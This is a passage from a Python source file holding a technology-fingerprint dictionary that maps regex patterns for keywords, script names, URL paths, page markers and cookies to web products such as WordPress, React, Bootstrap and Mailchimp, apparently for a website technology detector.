                    r'nextra': {'name': 'Nextra', 'category': 'development_tools'},
                    r'gitiles': {'name': 'Gitiles', 'category': 'development_tools'},
                    r'notion': {'name': 'Notion', 'category': 'development_tools'},
                    r'super.so': {'name': 'Super', 'category': 'development_tools'},
                    r'super': {'name': 'Super', 'category': 'development_tools'},
                    r'fruition': {'name': 'Fruition', 'category': 'development_tools'},
                    r'popsy': {'name': 'Popsy', 'category': 'development_tools'},
                    r'splitbee': {'name': 'Splitbee', 'category': 'development_tools'},
                    r'simple.ink': {'name': 'Simple.ink', 'category': 'development_tools'},
                    r'potion': {'name': 'Potion', 'category': 'development_tools'},
                    r'notaku': {'name': 'Notaku', 'category': 'development_tools'},
                    r'oopy': {'name': 'Oopy', 'category': 'development_tools'},
                    r'hostnotion': {'name': 'HostNotion', 'category': 'development_tools'},
                    r'notiondog': {'name': 'NotionDog', 'category': 'development_tools'},
                    r'feather': {'name': 'Feather', 'category': 'development_tools'},
                    r'helpkit': {'name': 'HelpKit', 'category': 'development_tools'},
                    r'landingfolio': {'name': 'Landingfolio', 'category': 'development_tools'},
                    r'unicorn platform': {'name': 'Unicorn Platform', 'category': 'development_tools'},
                    r'unicornplatform': {'name': 'Unicorn Platform', 'category': 'development_tools'},
                    r'landen': {'name': 'Landen', 'category': 'development_tools'},
                    r'instapage': {'name': 'Instapage', 'category': 'development_tools'},
                    r'unbounce': {'name': 'Unbounce', 'category': 'development_tools'},
                    r'leadpages': {'name': 'Leadpages', 'category': 'development_tools'},
                    r'clickfunnels': {'name': 'ClickFunnels', 'category': 'development_tools'},
                    r'convertri': {'name': 'Convertri', 'category': 'development_tools'},
                    r'landingi': {'name': 'Landingi', 'category': 'development_tools'},
                    r'getresponse': {'name': 'GetResponse', 'category': 'development_tools'},
                    r'mailchimp': {'name': 'Mailchimp', 'category': 'development_tools'},
                    r'constantcontact': {'name': 'Constant Contact', 'category': 'development_tools'},
                    r'aweber': {'name': 'AWeber', 'category': 'development_tools'},
                    r'sendinblue': {'name': 'Sendinblue', 'category': 'development_tools'},
                    r'brevo': {'name': 'Brevo', 'category': 'development_tools'},
                    r'campaign monitor': {'name': 'Campaign Monitor', 'category': 'development_tools'},
                    r'campaignmonitor': {'name': 'Campaign Monitor', 'category': 'development_tools'},
                    r'benchmark': {'name': 'Benchmark Email', 'category': 'development_tools'},
                    r'emma': {'name': 'Emma', 'category': 'development_tools'},
                    r'icontact': {'name': 'iContact', 'category': 'development_tools'},
                    r'vertical response': {'name': 'Vertical Response', 'category': 'development_tools'},
                    r'verticalresponse': {'name': 'Vertical Response', 'category': 'development_tools'},
                    r'mad mimi': {'name': 'Mad Mimi', 'category': 'development_tools'},
                    r'madmimi': {'name': 'Mad Mimi', 'category': 'development_tools'},
                    r'pinpointe': {'name': 'Pinpointe', 'category': 'development_tools'},
                    r'mailjet': {'name': 'Mailjet', 'category': 'development_tools'},
                    r'sendgrid': {'name': 'SendGrid', 'category': 'development_tools'},
                    r'postmark': {'name': 'Postmark', 'category': 'development_tools'},
                    r'mandrill': {'name': 'Mandrill', 'category': 'development_tools'},
                    r'sparkpost': {'name': 'SparkPost', 'category': 'development_tools'},
                    r'amazon ses': {'name': 'Amazon SES', 'category': 'development_tools'},
                    r'amazonses': {'name': 'Amazon SES', 'category': 'development_tools'},
                    r'ses': {'name': 'Amazon SES', 'category': 'development_tools'},
                    r'mailgun': {'name': 'Mailgun', 'category': 'development_tools'},
                    r'sendpulse': {'name': 'SendPulse', 'category': 'development_tools'},
                    r'elastic email': {'name': 'Elastic Email', 'category': 'development_tools'},
                    r'elasticemail': {'name': 'Elastic Email', 'category': 'development_tools'},
                    r'pepipost': {'name': 'Pepipost', 'category': 'development_tools'},
                    r'socketlabs': {'name': 'SocketLabs', 'category': 'development_tools'},
                    r'smtp2go': {'name': 'SMTP2GO', 'category': 'development_tools'},
                    r'mailersend': {'name': 'MailerSend', 'category': 'development_tools'},
                    r'resend': {'name': 'Resend', 'category': 'development_tools'},
                    r'loops': {'name': 'Loops', 'category': 'development_tools'},
                    r'convertkit': {'name': 'ConvertKit', 'category': 'development_tools'},
                    r'activecampaign': {'name': 'ActiveCampaign', 'category': 'development_tools'},
                    r'drip': {'name': 'Drip', 'category': 'development_tools'},
                    r'infusionsoft': {'name': 'Infusionsoft', 'category': 'development_tools'},
                    r'keap': {'name': 'Keap', 'category': 'development_tools'},
                    r'ontraport': {'name': 'Ontraport', 'category': 'development_tools'},
                    r'pardot': {'name': 'Pardot', 'category': 'development_tools'},
                    r'marketo': {'name': 'Marketo', 'category': 'development_tools'},
                    r'hubspot': {'name': 'HubSpot', 'category': 'development_tools'},
                    r'salesforce': {'name': 'Salesforce', 'category': 'development_tools'},
                    r'pipedrive': {'name': 'Pipedrive', 'category': 'development_tools'},
                    r'zoho crm': {'name': 'Zoho CRM', 'category': 'development_tools'},
                    r'zohocrm': {'name': 'Zoho CRM', 'category': 'development_tools'},
                    r'freshsales': {'name': 'Freshsales', 'category': 'development_tools'},
                    r'freshworks': {'name': 'Freshworks', 'category': 'development_tools'},
                    r'insightly': {'name': 'Insightly', 'category': 'development_tools'},
                    r'nimble': {'name': 'Nimble', 'category': 'development_tools'},
                    r'capsule': {'name': 'Capsule', 'category': 'development_tools'},
                    r'sugarcrm': {'name': 'SugarCRM', 'category': 'development_tools'},
                    r'vtiger': {'name': 'Vtiger', 'category': 'development_tools'},
                    r'zurmo': {'name': 'Zurmo', 'category': 'development_tools'},
                    r'x2crm': {'name': 'X2CRM', 'category': 'development_tools'},
                    r'yetiforce': {'name': 'YetiForce', 'category': 'development_tools'},
                    r'dolibarr': {'name': 'Dolibarr', 'category': 'development_tools'},
                    r'civicrm': {'name': 'CiviCRM', 'category': 'development_tools'},
                    r'xcrm': {'name': 'XCRM', 'category': 'development_tools'},
                    r'espocrm': {'name': 'EspoCRM', 'category': 'development_tools'},
                    r'suitecrm': {'name': 'SuiteCRM', 'category': 'development_tools'},
                    r'crm': {'name': 'CRM System', 'category': 'development_tools'}
                },
                
                # Script sources
                'script_src': {
                    # Popular JavaScript Libraries
                    r'jquery[.-](\d+\.\d+\.\d+)': {'name': 'jQuery', 'category': 'javascript_libraries'},
                    r'lodash[.-](\d+\.\d+\.\d+)': {'name': 'Lodash', 'category': 'javascript_libraries'},
                    r'underscore[.-](\d+\.\d+\.\d+)': {'name': 'Underscore.js', 'category': 'javascript_libraries'},
                    r'moment[.-](\d+\.\d+\.\d+)': {'name': 'Moment.js', 'category': 'javascript_libraries'},
                    r'dayjs[.-](\d+\.\d+\.\d+)': {'name': 'Day.js', 'category': 'javascript_libraries'},
                    r'date-fns[.-](\d+\.\d+\.\d+)': {'name': 'date-fns', 'category': 'javascript_libraries'},
                    r'luxon[.-](\d+\.\d+\.\d+)': {'name': 'Luxon', 'category': 'javascript_libraries'},
                    r'ramda[.-](\d+\.\d+\.\d+)': {'name': 'Ramda', 'category': 'javascript_libraries'},
                    r'immutable[.-](\d+\.\d+\.\d+)': {'name': 'Immutable.js', 'category': 'javascript_libraries'},
                    r'rxjs[.-](\d+\.\d+\.\d+)': {'name': 'RxJS', 'category': 'javascript_libraries'},
                    r'axios[.-](\d+\.\d+\.\d+)': {'name': 'Axios', 'category': 'javascript_libraries'},
                    r'fetch[.-](\d+\.\d+\.\d+)': {'name': 'Fetch API', 'category': 'javascript_libraries'},
                    r'superagent[.-](\d+\.\d+\.\d+)': {'name': 'SuperAgent', 'category': 'javascript_libraries'},
                    r'ky[.-](\d+\.\d+\.\d+)': {'name': 'Ky', 'category': 'javascript_libraries'},
                    r'node-fetch[.-](\d+\.\d+\.\d+)': {'name': 'node-fetch', 'category': 'javascript_libraries'},
                    r'cross-fetch[.-](\d+\.\d+\.\d+)': {'name': 'cross-fetch', 'category': 'javascript_libraries'},
                    r'whatwg-fetch[.-](\d+\.\d+\.\d+)': {'name': 'whatwg-fetch', 'category': 'javascript_libraries'},
                    
                    # Frontend Frameworks
                    r'react[.-](\d+\.\d+\.\d+)': {'name': 'React', 'category': 'frontend_frameworks'},
                    r'react-dom[.-](\d+\.\d+\.\d+)': {'name': 'React DOM', 'category': 'frontend_frameworks'},
                    r'react-router[.-](\d+\.\d+\.\d+)': {'name': 'React Router', 'category': 'frontend_frameworks'},
                    r'next[.-](\d+\.\d+\.\d+)': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'gatsby[.-](\d+\.\d+\.\d+)': {'name': 'Gatsby', 'category': 'frontend_frameworks'},
                    r'preact[.-](\d+\.\d+\.\d+)': {'name': 'Preact', 'category': 'frontend_frameworks'},
                    r'inferno[.-](\d+\.\d+\.\d+)': {'name': 'Inferno', 'category': 'frontend_frameworks'},
                    r'vue[.-](\d+\.\d+\.\d+)': {'name': 'Vue.js', 'category': 'frontend_frameworks'},
                    r'vuex[.-](\d+\.\d+\.\d+)': {'name': 'Vuex', 'category': 'frontend_frameworks'},
                    r'vue-router[.-](\d+\.\d+\.\d+)': {'name': 'Vue Router', 'category': 'frontend_frameworks'},
                    r'nuxt[.-](\d+\.\d+\.\d+)': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'quasar[.-](\d+\.\d+\.\d+)': {'name': 'Quasar', 'category': 'frontend_frameworks'},
                    r'vuepress[.-](\d+\.\d+\.\d+)': {'name': 'VuePress', 'category': 'frontend_frameworks'},
                    r'vitepress[.-](\d+\.\d+\.\d+)': {'name': 'VitePress', 'category': 'frontend_frameworks'},
                    r'gridsome[.-](\d+\.\d+\.\d+)': {'name': 'Gridsome', 'category': 'frontend_frameworks'},
                    r'angular[.-](\d+\.\d+\.\d+)': {'name': 'Angular', 'category': 'frontend_frameworks'},
                    r'angularjs[.-](\d+\.\d+\.\d+)': {'name': 'AngularJS', 'category': 'frontend_frameworks'},
                    r'@angular[/\\\\]core[.-](\d+\.\d+\.\d+)': {'name': 'Angular Core', 'category': 'frontend_frameworks'},
                    r'@angular[/\\\\]router[.-](\d+\.\d+\.\d+)': {'name': 'Angular Router', 'category': 'frontend_frameworks'},
                    r'@angular[/\\\\]common[.-](\d+\.\d+\.\d+)': {'name': 'Angular Common', 'category': 'frontend_frameworks'},
                    r'svelte[.-](\d+\.\d+\.\d+)': {'name': 'Svelte', 'category': 'frontend_frameworks'},
                    r'sveltekit[.-](\d+\.\d+\.\d+)': {'name': 'SvelteKit', 'category': 'frontend_frameworks'},
                    r'sapper[.-](\d+\.\d+\.\d+)': {'name': 'Sapper', 'category': 'frontend_frameworks'},
                    r'alpine[.-](\d+\.\d+\.\d+)': {'name': 'Alpine.js', 'category': 'frontend_frameworks'},
                    r'alpinejs[.-](\d+\.\d+\.\d+)': {'name': 'Alpine.js', 'category': 'frontend_frameworks'},
                    r'stimulus[.-](\d+\.\d+\.\d+)': {'name': 'Stimulus', 'category': 'frontend_frameworks'},
                    r'turbo[.-](\d+\.\d+\.\d+)': {'name': 'Turbo', 'category': 'frontend_frameworks'},
                    r'hotwire[.-](\d+\.\d+\.\d+)': {'name': 'Hotwire', 'category': 'frontend_frameworks'},
                    r'ember[.-](\d+\.\d+\.\d+)': {'name': 'Ember.js', 'category': 'frontend_frameworks'},
                    r'backbone[.-](\d+\.\d+\.\d+)': {'name': 'Backbone.js', 'category': 'frontend_frameworks'},
                    r'marionette[.-](\d+\.\d+\.\d+)': {'name': 'Marionette.js', 'category': 'frontend_frameworks'},
                    r'knockout[.-](\d+\.\d+\.\d+)': {'name': 'Knockout.js', 'category': 'frontend_frameworks'},
                    r'aurelia[.-](\d+\.\d+\.\d+)': {'name': 'Aurelia', 'category': 'frontend_frameworks'},
                    r'polymer[.-](\d+\.\d+\.\d+)': {'name': 'Polymer', 'category': 'frontend_frameworks'},
                    r'lit[.-](\d+\.\d+\.\d+)': {'name': 'Lit', 'category': 'frontend_frameworks'},
                    r'lit-element[.-](\d+\.\d+\.\d+)': {'name': 'LitElement', 'category': 'frontend_frameworks'},
                    r'lit-html[.-](\d+\.\d+\.\d+)': {'name': 'lit-html', 'category': 'frontend_frameworks'},
                    r'stencil[.-](\d+\.\d+\.\d+)': {'name': 'Stencil', 'category': 'frontend_frameworks'},
                    r'solid[.-](\d+\.\d+\.\d+)': {'name': 'Solid.js', 'category': 'frontend_frameworks'},
                    r'qwik[.-](\d+\.\d+\.\d+)': {'name': 'Qwik', 'category': 'frontend_frameworks'},
                    r'mithril[.-](\d+\.\d+\.\d+)': {'name': 'Mithril.js', 'category': 'frontend_frameworks'},
                    r'riot[.-](\d+\.\d+\.\d+)': {'name': 'Riot.js', 'category': 'frontend_frameworks'},
                    r'hyperapp[.-](\d+\.\d+\.\d+)': {'name': 'Hyperapp', 'category': 'frontend_frameworks'},
                    r'choo[.-](\d+\.\d+\.\d+)': {'name': 'Choo', 'category': 'frontend_frameworks'},
                    r'cycle[.-](\d+\.\d+\.\d+)': {'name': 'Cycle.js', 'category': 'frontend_frameworks'},
                    r'elm[.-](\d+\.\d+\.\d+)': {'name': 'Elm', 'category': 'frontend_frameworks'},
                    r'purescript[.-](\d+\.\d+\.\d+)': {'name': 'PureScript', 'category': 'frontend_frameworks'},
                    r'reason[.-](\d+\.\d+\.\d+)': {'name': 'Reason', 'category': 'frontend_frameworks'},
                    r'rescript[.-](\d+\.\d+\.\d+)': {'name': 'ReScript', 'category': 'frontend_frameworks'},
                    r'bucklescript[.-](\d+\.\d+\.\d+)': {'name': 'BuckleScript', 'category': 'frontend_frameworks'},
                    
                    # CSS Frameworks & UI Libraries
                    r'bootstrap[.-](\d+\.\d+\.\d+)': {'name': 'Bootstrap', 'category': 'css_frameworks'},
                    r'@bootstrap[/\\\\]css[.-](\d+\.\d+\.\d+)': {'name': 'Bootstrap CSS', 'category': 'css_frameworks'},
                    r'@bootstrap[/\\\\]js[.-](\d+\.\d+\.\d+)': {'name': 'Bootstrap JS', 'category': 'css_frameworks'},
                    r'tailwindcss[.-](\d+\.\d+\.\d+)': {'name': 'Tailwind CSS', 'category': 'css_frameworks'},
                    r'tailwind[.-](\d+\.\d+\.\d+)': {'name': 'Tailwind CSS', 'category': 'css_frameworks'},
                    r'@tailwindcss[/\\\\]base[.-](\d+\.\d+\.\d+)': {'name': 'Tailwind CSS', 'category': 'css_frameworks'},
                    r'bulma[.-](\d+\.\d+\.\d+)': {'name': 'Bulma', 'category': 'css_frameworks'},
                    r'foundation[.-](\d+\.\d+\.\d+)': {'name': 'Foundation', 'category': 'css_frameworks'},
                    r'semantic-ui[.-](\d+\.\d+\.\d+)': {'name': 'Semantic UI', 'category': 'css_frameworks'},
                    r'uikit[.-](\d+\.\d+\.\d+)': {'name': 'UIkit', 'category': 'css_frameworks'},
                    r'materialize[.-](\d+\.\d+\.\d+)': {'name': 'Materialize', 'category': 'css_frameworks'},
                    r'material-ui[.-](\d+\.\d+\.\d+)': {'name': 'Material-UI', 'category': 'css_frameworks'},
                    r'@mui[/\\\\]material[.-](\d+\.\d+\.\d+)': {'name': 'MUI', 'category': 'css_frameworks'},
                    r'@mui[/\\\\]core[.-](\d+\.\d+\.\d+)': {'name': 'MUI Core', 'category': 'css_frameworks'},
                    r'@material-ui[/\\\\]core[.-](\d+\.\d+\.\d+)': {'name': 'Material-UI Core', 'category': 'css_frameworks'},
                    r'ant-design[.-](\d+\.\d+\.\d+)': {'name': 'Ant Design', 'category': 'css_frameworks'},
                    r'antd[.-](\d+\.\d+\.\d+)': {'name': 'Ant Design', 'category': 'css_frameworks'},
                    r'chakra-ui[.-](\d+\.\d+\.\d+)': {'name': 'Chakra UI', 'category': 'css_frameworks'},
                    r'@chakra-ui[/\\\\]react[.-](\d+\.\d+\.\d+)': {'name': 'Chakra UI', 'category': 'css_frameworks'},
                    r'mantine[.-](\d+\.\d+\.\d+)': {'name': 'Mantine', 'category': 'css_frameworks'},
                    r'@mantine[/\\\\]core[.-](\d+\.\d+\.\d+)': {'name': 'Mantine', 'category': 'css_frameworks'},
                    r'nextui[.-](\d+\.\d+\.\d+)': {'name': 'NextUI', 'category': 'css_frameworks'},
                    r'@nextui-org[/\\\\]react[.-](\d+\.\d+\.\d+)': {'name': 'NextUI', 'category': 'css_frameworks'},
                    r'styled-components[.-](\d+\.\d+\.\d+)': {'name': 'styled-components', 'category': 'css_frameworks'},
                    r'emotion[.-](\d+\.\d+\.\d+)': {'name': 'Emotion', 'category': 'css_frameworks'},
                    r'@emotion[/\\\\]react[.-](\d+\.\d+\.\d+)': {'name': 'Emotion', 'category': 'css_frameworks'},
                    r'@emotion[/\\\\]styled[.-](\d+\.\d+\.\d+)': {'name': 'Emotion Styled', 'category': 'css_frameworks'},
                    r'stitches[.-](\d+\.\d+\.\d+)': {'name': 'Stitches', 'category': 'css_frameworks'},
                    r'@stitches[/\\\\]react[.-](\d+\.\d+\.\d+)': {'name': 'Stitches', 'category': 'css_frameworks'},
                    r'vanilla-extract[.-](\d+\.\d+\.\d+)': {'name': 'Vanilla Extract', 'category': 'css_frameworks'},
                    r'linaria[.-](\d+\.\d+\.\d+)': {'name': 'Linaria', 'category': 'css_frameworks'},
                    r'jss[.-](\d+\.\d+\.\d+)': {'name': 'JSS', 'category': 'css_frameworks'},
                    r'react-jss[.-](\d+\.\d+\.\d+)': {'name': 'React JSS', 'category': 'css_frameworks'},
                    r'styled-jsx[.-](\d+\.\d+\.\d+)': {'name': 'styled-jsx', 'category': 'css_frameworks'},
                    r'glamorous[.-](\d+\.\d+\.\d+)': {'name': 'Glamorous', 'category': 'css_frameworks'},
                    r'tachyons[.-](\d+\.\d+\.\d+)': {'name': 'Tachyons', 'category': 'css_frameworks'},
                    r'spectre[.-](\d+\.\d+\.\d+)': {'name': 'Spectre.css', 'category': 'css_frameworks'},
                    r'milligram[.-](\d+\.\d+\.\d+)': {'name': 'Milligram', 'category': 'css_frameworks'},
                    r'pure[.-](\d+\.\d+\.\d+)': {'name': 'Pure.css', 'category': 'css_frameworks'},
                    r'skeleton[.-](\d+\.\d+\.\d+)': {'name': 'Skeleton', 'category': 'css_frameworks'},
                    r'normalize[.-](\d+\.\d+\.\d+)': {'name': 'Normalize.css', 'category': 'css_frameworks'},
                    r'reset[.-](\d+\.\d+\.\d+)': {'name': 'CSS Reset', 'category': 'css_frameworks'},
                    r'animate[.-](\d+\.\d+\.\d+)': {'name': 'Animate.css', 'category': 'css_frameworks'},
                    r'animate\.css[.-](\d+\.\d+\.\d+)': {'name': 'Animate.css', 'category': 'css_frameworks'},
                    r'hover[.-](\d+\.\d+\.\d+)': {'name': 'Hover.css', 'category': 'css_frameworks'},
                    r'aos[.-](\d+\.\d+\.\d+)': {'name': 'AOS', 'category': 'css_frameworks'},
                    r'wow[.-](\d+\.\d+\.\d+)': {'name': 'WOW.js', 'category': 'css_frameworks'},
                    r'wowjs[.-](\d+\.\d+\.\d+)': {'name': 'WOW.js', 'category': 'css_frameworks'},
                    
                    # Data Visualization
                    r'd3[.-](\d+\.\d+\.\d+)': {'name': 'D3.js', 'category': 'javascript_libraries'},
                    r'd3js[.-](\d+\.\d+\.\d+)': {'name': 'D3.js', 'category': 'javascript_libraries'},
                    r'chart[.-]js[.-](\d+\.\d+\.\d+)': {'name': 'Chart.js', 'category': 'javascript_libraries'},
                    r'chartjs[.-](\d+\.\d+\.\d+)': {'name': 'Chart.js', 'category': 'javascript_libraries'},
                    r'three[.-](\d+\.\d+\.\d+)': {'name': 'Three.js', 'category': 'javascript_libraries'},
                    r'threejs[.-](\d+\.\d+\.\d+)': {'name': 'Three.js', 'category': 'javascript_libraries'},
                    r'@three[/\\\\]fiber[.-](\d+\.\d+\.\d+)': {'name': 'React Three Fiber', 'category': 'javascript_libraries'},
                    r'@react-three[/\\\\]fiber[.-](\d+\.\d+\.\d+)': {'name': 'React Three Fiber', 'category': 'javascript_libraries'},
                    r'recharts[.-](\d+\.\d+\.\d+)': {'name': 'Recharts', 'category': 'javascript_libraries'},
                    r'victory[.-](\d+\.\d+\.\d+)': {'name': 'Victory', 'category': 'javascript_libraries'},
                    r'nivo[.-](\d+\.\d+\.\d+)': {'name': 'Nivo', 'category': 'javascript_libraries'},
                    r'@nivo[/\\\\]core[.-](\d+\.\d+\.\d+)': {'name': 'Nivo', 'category': 'javascript_libraries'},
                    r'visx[.-](\d+\.\d+\.\d+)': {'name': 'visx', 'category': 'javascript_libraries'},
                    r'@visx[/\\\\]group[.-](\d+\.\d+\.\d+)': {'name': 'visx', 'category': 'javascript_libraries'},
                    r'react-vis[.-](\d+\.\d+\.\d+)': {'name': 'react-vis', 'category': 'javascript_libraries'},
                    r'plotly[.-](\d+\.\d+\.\d+)': {'name': 'Plotly.js', 'category': 'javascript_libraries'},
                    r'plotlyjs[.-](\d+\.\d+\.\d+)': {'name': 'Plotly.js', 'category': 'javascript_libraries'},
                    r'highcharts[.-](\d+\.\d+\.\d+)': {'name': 'Highcharts', 'category': 'javascript_libraries'},
                    r'echarts[.-](\d+\.\d+\.\d+)': {'name': 'ECharts', 'category': 'javascript_libraries'},
                    r'apexcharts[.-](\d+\.\d+\.\d+)': {'name': 'ApexCharts', 'category': 'javascript_libraries'},
                    r'canvasjs[.-](\d+\.\d+\.\d+)': {'name': 'CanvasJS', 'category': 'javascript_libraries'},
                    r'fusioncharts[.-](\d+\.\d+\.\d+)': {'name': 'FusionCharts', 'category': 'javascript_libraries'},
                    r'amcharts[.-](\d+\.\d+\.\d+)': {'name': 'amCharts', 'category': 'javascript_libraries'},
                    r'c3[.-](\d+\.\d+\.\d+)': {'name': 'C3.js', 'category': 'javascript_libraries'},
                    r'nvd3[.-](\d+\.\d+\.\d+)': {'name': 'NVD3', 'category': 'javascript_libraries'},
                    r'dimple[.-](\d+\.\d+\.\d+)': {'name': 'Dimple', 'category': 'javascript_libraries'},
                    r'dc[.-](\d+\.\d+\.\d+)': {'name': 'DC.js', 'category': 'javascript_libraries'},
                    r'dcjs[.-](\d+\.\d+\.\d+)': {'name': 'DC.js', 'category': 'javascript_libraries'},
                    r'crossfilter[.-](\d+\.\d+\.\d+)': {'name': 'Crossfilter', 'category': 'javascript_libraries'},
                    r'leaflet[.-](\d+\.\d+\.\d+)': {'name': 'Leaflet', 'category': 'javascript_libraries'},
                    r'mapbox[.-](\d+\.\d+\.\d+)': {'name': 'Mapbox GL JS', 'category': 'javascript_libraries'},
                    r'openlayers[.-](\d+\.\d+\.\d+)': {'name': 'OpenLayers', 'category': 'javascript_libraries'},
                    r'ol[.-](\d+\.\d+\.\d+)': {'name': 'OpenLayers', 'category': 'javascript_libraries'},
                    r'cesium[.-](\d+\.\d+\.\d+)': {'name': 'Cesium', 'category': 'javascript_libraries'},
                    r'deck[.-]gl[.-](\d+\.\d+\.\d+)': {'name': 'deck.gl', 'category': 'javascript_libraries'},
                    r'kepler[.-]gl[.-](\d+\.\d+\.\d+)': {'name': 'Kepler.gl', 'category': 'javascript_libraries'},
                    r'uber[.-]deck[.-](\d+\.\d+\.\d+)': {'name': 'deck.gl', 'category': 'javascript_libraries'},
                    
                    # State Management
                    r'redux[.-](\d+\.\d+\.\d+)': {'name': 'Redux', 'category': 'javascript_libraries'},
                    r'react-redux[.-](\d+\.\d+\.\d+)': {'name': 'React Redux', 'category': 'javascript_libraries'},
                    r'@reduxjs[/\\\\]toolkit[.-](\d+\.\d+\.\d+)': {'name': 'Redux Toolkit', 'category': 'javascript_libraries'},
                    r'mobx[.-](\d+\.\d+\.\d+)': {'name': 'MobX', 'category': 'javascript_libraries'},
                    r'mobx-react[.-](\d+\.\d+\.\d+)': {'name': 'MobX React', 'category': 'javascript_libraries'},
                    r'mobx-state-tree[.-](\d+\.\d+\.\d+)': {'name': 'MobX State Tree', 'category': 'javascript_libraries'},
                    r'zustand[.-](\d+\.\d+\.\d+)': {'name': 'Zustand', 'category': 'javascript_libraries'},
                    r'recoil[.-](\d+\.\d+\.\d+)': {'name': 'Recoil', 'category': 'javascript_libraries'},
                    r'jotai[.-](\d+\.\d+\.\d+)': {'name': 'Jotai', 'category': 'javascript_libraries'},
                    r'valtio[.-](\d+\.\d+\.\d+)': {'name': 'Valtio', 'category': 'javascript_libraries'},
                    r'xstate[.-](\d+\.\d+\.\d+)': {'name': 'XState', 'category': 'javascript_libraries'},
                    r'@xstate[/\\\\]react[.-](\d+\.\d+\.\d+)': {'name': 'XState React', 'category': 'javascript_libraries'},
                    r'unstated[.-](\d+\.\d+\.\d+)': {'name': 'Unstated', 'category': 'javascript_libraries'},
                    r'unstated-next[.-](\d+\.\d+\.\d+)': {'name': 'Unstated Next', 'category': 'javascript_libraries'},
                    r'constate[.-](\d+\.\d+\.\d+)': {'name': 'Constate', 'category': 'javascript_libraries'},
                    r'easy-peasy[.-](\d+\.\d+\.\d+)': {'name': 'Easy Peasy', 'category': 'javascript_libraries'},
                    r'pullstate[.-](\d+\.\d+\.\d+)': {'name': 'Pullstate', 'category': 'javascript_libraries'},
                    r'effector[.-](\d+\.\d+\.\d+)': {'name': 'Effector', 'category': 'javascript_libraries'},
                    r'overmind[.-](\d+\.\d+\.\d+)': {'name': 'Overmind', 'category': 'javascript_libraries'},
                    r'cerebral[.-](\d+\.\d+\.\d+)': {'name': 'Cerebral', 'category': 'javascript_libraries'},
                    r'flux[.-](\d+\.\d+\.\d+)': {'name': 'Flux', 'category': 'javascript_libraries'},
                    r'reflux[.-](\d+\.\d+\.\d+)': {'name': 'Reflux', 'category': 'javascript_libraries'},
                    r'alt[.-](\d+\.\d+\.\d+)': {'name': 'Alt', 'category': 'javascript_libraries'},
                    r'flummox[.-](\d+\.\d+\.\d+)': {'name': 'Flummox', 'category': 'javascript_libraries'},
                    r'marty[.-](\d+\.\d+\.\d+)': {'name': 'Marty.js', 'category': 'javascript_libraries'},
                    r'baobab[.-](\d+\.\d+\.\d+)': {'name': 'Baobab', 'category': 'javascript_libraries'},
                    r'nuclear[.-](\d+\.\d+\.\d+)': {'name': 'Nuclear.js', 'category': 'javascript_libraries'}
                },
                
                # URL patterns
                'url_patterns': {
                    r'/wp-content/': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'/wp-admin/': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'/wp-includes/': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'/sites/default/files/': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'/modules/': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'/media/joomla/': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'/administrator/': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'/_next/': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'/_nuxt/': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'/static/': {'name': 'Static Site Generator', 'category': 'development_tools'},
                    r'/assets/': {'name': 'Static Assets', 'category': 'development_tools'},
                    r'/sites/all/modules/': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'/skin/frontend/': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'/js/mage/': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'/content/ghost/': {'name': 'Ghost', 'category': 'cms_platforms'},
                    r'cdn\.shopify\.com': {'name': 'Shopify', 'category': 'cms_platforms'},
                    r'/_app/': {'name': 'SvelteKit', 'category': 'frontend_frameworks'},
                    r'/graphql': {'name': 'GraphQL API', 'category': 'backend_technologies'},
                    r'/api/v[0-9]+/': {'name': 'REST API', 'category': 'backend_technologies'}
                },
                
                # Content patterns
                'content_patterns': {
                    r'<html[^>]+ng-app': {'name': 'AngularJS', 'category': 'frontend_frameworks'},
                    r'data-react-helmet': {'name': 'React Helmet', 'category': 'frontend_frameworks'},
                    r'__NEXT_DATA__': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'__NUXT__': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'wp-emoji': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'Drupal\.settings': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'window\.Joomla': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'Mage\.Cookies': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'Shopify\.theme': {'name': 'Shopify', 'category': 'cms_platforms'},
                    r'Squarespace\.Constants': {'name': 'Squarespace', 'category': 'cms_platforms'},
                    r'Wix\.Utils': {'name': 'Wix', 'category': 'cms_platforms'},
                    r'ghost\.url': {'name': 'Ghost', 'category': 'cms_platforms'},
                    r'<!-- This is a WordPress theme -->': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'<!-- Powered by Drupal -->': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'<!-- Powered by Joomla! -->': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'<!-- Powered by Magento -->': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'<!-- Powered by Ghost -->': {'name': 'Ghost', 'category': 'cms_platforms'},
                    r'<div id="app" data-v-': {'name': 'Vue.js', 'category': 'frontend_frameworks'},
                    r'<html[^>]+ng-app': {'name': 'AngularJS', 'category': 'frontend_frameworks'},
                    r'<div[^>]+x-data': {'name': 'Alpine.js', 'category': 'frontend_frameworks'},
                    r'<input type="hidden" name="csrfmiddlewaretoken"': {'name': 'Django', 'category': 'backend_technologies'},
                    r'<form[^>]+action="/login"': {'name': 'Flask', 'category': 'backend_technologies'},
                    r'<meta name="_csrf"': {'name': 'Spring Boot', 'category': 'backend_technologies'},
                    r'<meta name="csrf-token" content="[^"]+"': {'name': 'Ruby on Rails', 'category': 'backend_technologies'}
                }
            },
            
            'cookies': {
                'PHPSESSID': {'name': 'PHP', 'category': 'backend_technologies'},
                'JSESSIONID': {'name': 'Java/JSP', 'category': 'backend_technologies'},
                'ASP.NET_SessionId': {'name': 'ASP.NET', 'category': 'backend_technologies'},
